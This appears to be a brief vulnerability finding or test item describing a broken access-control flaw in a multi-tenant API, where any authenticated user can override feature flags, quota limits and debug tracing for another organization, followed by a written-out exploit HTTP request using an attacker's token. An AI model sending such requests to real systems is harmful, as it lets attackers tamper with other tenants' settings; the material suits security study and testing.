diagnosis: The endpoint allows setting feature flags and debug tracing for any org_slug in the URL without checking whether current_user is an administrator belonging to org_slug. An attacker can enable debug tracing or increase quota limits on target organizations.
exploit_request:
POST /api/v1/tenants/target-org/features/override HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"enable_beta_ai": true, "max_export_rows": 500000, "debug_tracing": true}
